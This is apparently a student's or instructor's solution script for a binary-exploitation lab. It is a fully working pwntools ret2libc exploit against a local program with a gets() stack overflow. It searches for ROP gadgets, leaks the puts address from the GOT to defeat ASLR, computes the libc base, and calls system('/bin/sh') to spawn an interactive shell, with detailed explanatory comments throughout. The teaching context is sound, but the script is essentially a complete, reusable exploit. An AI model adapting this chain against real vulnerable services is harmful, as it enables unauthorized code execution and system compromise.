#!/usr/bin/env python3
#
# Lab 4 – Exercise 1: ret2libc exploit for ./bin/ex1
#
# Target (ex1.c):
#   - Prints an intro string, then:
#       char name[32];
#       puts("What was her name?");
#       gets(name);
#   - `gets()` reads an arbitrary-length line into a 32-byte buffer → classic
#     stack buffer overflow (no canary, no bounds check).
#
# Mitigation situation (from the lab statement):
#   - PIE disabled for the binary → its code addresses are fixed.
#   - Libraries (libc) are ASLR-randomized per run.
#   - Stack is non-executable, so we use ret2libc instead of shellcode.
#
# High-level plan:
#   1. Stage 1: Use the overflow in `main()` to build a ROP chain:
#        - call puts(puts@GOT) to *leak* the libc address of puts()
#        - then return to main() to trigger gets() again
#   2. Use the leaked puts address to compute libc base:
#        libc_base = leaked_puts - libc.symbols['puts']
#   3. Stage 2: Overflow again and build a second ROP chain:
#        - call system("/bin/sh") using libc’s system and "/bin/sh" string
#   4. Enjoy the shell.
#
# The “weird” function power() was compiled with no_caller_saved_registers,
# so the compiler generously produced lots of POP gadgets, including pop rdi.

import sys
from pwn import *

# === Configuration ===

exe = './bin/ex1'

# Load the target binary and let pwntools parse its ELF structure (PLT, GOT, symbols).
context.binary = elf = ELF(exe, checksec=False)

# Show informational logs while running the exploit.
context.log_level = 'info'


def find_gadget(seq: bytes, name: str):
    """
    Search for a short gadget by raw bytes inside executable segments.

    Args:
        seq  – the byte sequence to search for (e.g. b'\x5f\xc3' = pop rdi; ret)
        name – human-readable name for logging

    Returns:
        Virtual address of the first occurrence of `seq`, or None if not found.
    """
    for segment in elf.segments:
        # p_flags & 1 → PF_X bit → executable segment (.text, etc.)
        if segment.header.p_flags & 1:
            data = segment.data()               # raw bytes of this segment
            start = segment.header.p_vaddr      # where it is mapped in memory
            off = data.find(seq)                # offset of `seq` inside segment
            if off != -1:
                addr = start + off
                log.success(f"Found {name} at {hex(addr)}")
                return addr
    return None


def main():
    print("=== Lab 4 Ex 1: Ret2Libc Solver ===")

    # === 1. Find gadgets ===
    #
    # We need a way to control RDI, because on x86-64 the first function
    # argument is passed in the RDI register.
    #
    # We look for:
    #   - clean gadget:  pop rdi; ret          (bytes: 5f c3)
    #   - dirty gadget:  pop rdi; pop rbp; ret (bytes: 5f 5d c3)
    #
    # The dirty gadget consumes an extra 8 bytes (for RBP), so we’ll have
    # to add a dummy value in the chain if that’s the one we find.
    pop_rdi = find_gadget(b'\x5f\xc3', "pop rdi; ret")
    dirty_rdi = False

    if not pop_rdi:
        # Fallback to the “dirty” gadget (pop rdi; pop rbp; ret)
        pop_rdi = find_gadget(b'\x5f\x5d\xc3', "pop rdi; pop rbp; ret")
        dirty_rdi = True

    if not pop_rdi:
        log.error("Could not find pop rdi gadget via byte search.")
        return

    # A plain `ret` gadget (single 0xc3) – used later to help stack alignment
    # before calling system() from libc, which sometimes expects 16-byte
    # stack alignment.
    ret_gadget = find_gadget(b'\xc3', "ret")

    # === 2. Important PLT/GOT/symbol addresses from the binary ===
    #
    # puts@plt:
    #   - PLT stub that eventually calls libc's puts().
    #   - Its address is fixed because ex1 is non-PIE.
    #
    # puts@got:
    #   - Entry in the Global Offset Table holding the *runtime* address
    #     of puts() in libc (ASLR-randomized).
    #
    # main:
    #   - We will jump back to main after leaking the address so that
    #     we can reuse the gets() overflow in a second stage.
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_sym = elf.symbols['main']

    # Stack layout in main():
    #
    #   [ name[32]                ]  <-- char name[32];
    #   [ saved RBP (8 bytes)     ]
    #   [ saved RIP (8 bytes)     ]
    #
    # To overwrite saved RIP, we need 32 + 8 = 40 padding bytes.
    offset = 40

    log.info(f"puts@plt: {hex(puts_plt)}")
    log.info(f"puts@got: {hex(puts_got)}")

    # === 3. Start the vulnerable process ===
    p = process(exe)

    # The program prints:
    #   intro string
    #   "What was her name?"
    #
    # We sync until the input prompt, then send our first stage payload.
    p.recvuntil(b'name?\n')

    # === 4. Stage 1: Leak a libc address via puts(puts@GOT) ===
    #
    # Goal of stage 1:
    #   - Overwrite RIP so that:
    #
    #       main() RET → pop_rdi;
    #                    RDI = puts@GOT;
    #                    puts@plt(RDI);
    #                    return to main();
    #
    #   - puts(puts@GOT) will print the libc address of puts().
    #   - After puts returns, we jump back to main to re-trigger gets().
    #
    # Chain layout after 40 bytes of padding:
    #   pop_rdi
    #   -> RDI = puts_got
    #   [if dirty] dummy for pop rbp
    #   puts_plt(puts_got)
    #   main_sym
    chain1 = b'A' * offset
    chain1 += p64(pop_rdi)
    chain1 += p64(puts_got)
    if dirty_rdi:
        # For gadget "pop rdi; pop rbp; ret", we must provide a dummy
        # value for RBP as well.
        chain1 += p64(0xdeadbeef)
    chain1 += p64(puts_plt)   # call puts(puts_got)
    chain1 += p64(main_sym)   # after puts returns, go back to main

    log.info("Sending Leak Payload (Stage 1)...")
    p.sendline(chain1)

    # === 5. Parse the leaked address of puts() ===
    #
    # puts(puts_got) will write the address of puts() in libc to stdout,
    # followed by a newline. We read that line and turn it into a 64-bit
    # integer.
    try:
        leak_line = p.recvline()
        if len(leak_line) < 6:
            # Sometimes an extra empty line or small garbage might appear,
            # so we read another line in that case.
            leak_line = p.recvline()

        # strip() removes the trailing '\n'; ljust(8, '\x00') pads to 8 bytes;
        # u64() converts it into an integer.
        leak_int = u64(leak_line.strip().ljust(8, b'\x00'))
        log.success(f"Leaked puts: {hex(leak_int)}")
    except Exception as e:
        log.error(f"Leak failed: {e}")
        return

    # === 6. Resolve libc base address ===
    #
    # Now we know:
    #   leak_int == libc_base + libc.symbols['puts']
    #
    # So:
    #   libc_base = leak_int - libc.symbols['puts']
    #
    # pwntools attaches a matching libc to ELF objects as `elf.libc` if it
    # can find it on the system.
    try:
        libc = elf.libc
        libc.address = leak_int - libc.symbols['puts']
        log.success(f"Libc Base: {hex(libc.address)}")
    except Exception:
        log.error("Could not find local libc (elf.libc).")
        return

    # === 7. Stage 2: Get a shell with system('/bin/sh') ===
    #
    # Because we returned to main_sym at the end of Stage 1, the program
    # has restarted main() and will again:
    #   - print the intro text
    #   - print "What was her name?"
    #   - call gets(name) → same overflow
    #
    # We wait for the second "name?" prompt, and then send our second payload.
    p.recvuntil(b'name?\n')

    # Now we know libc base, so we can locate:
    #   system()       – libc.symbols['system']
    #   "/bin/sh\0"    – searching the libc data for that string
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh\x00'))

    # Stage 2 ROP chain:
    #
    #  main() RET → pop_rdi;
    #               RDI = binsh;
    #               [if dirty: pop rbp dummy]
    #               ret (alignment / ROP "NOP")
    #               system(binsh);
    #
    # We prepend 40 'A' bytes to reach saved RIP again.
    chain2 = b'A' * offset
    chain2 += p64(pop_rdi)
    chain2 += p64(binsh)
    if dirty_rdi:
        # If our pop_rdi gadget also pops RBP, we must supply a dummy
        # second value again.
        chain2 += p64(0)

    # Stack alignment:
    #
    # On x86-64 SysV ABI, functions expect the stack to be 16-byte aligned
    # at call boundaries. Depending on how many values we popped, we can
    # end up 8-byte misaligned, and some libc functions (via movaps)
    # may crash in that case.
    #
    # Common pattern in ret2libc:
    #   add a single 'ret' before calling system() – it effectively acts
    #   as a ROP NOP and can fix alignment issues.
    chain2 += p64(ret_gadget)

    # Finally, jump into system("/bin/sh").
    chain2 += p64(system)

    log.info("Sending Shell Payload (Stage 2)...")
    p.sendline(chain2)

    # === 8. Interact with the shell ===
    #
    # Clean any buffered output and then send a quick test command.
    p.clean(timeout=0.2)
    p.sendline(b'id; ls')
    p.interactive()


if __name__ == "__main__":
    main()

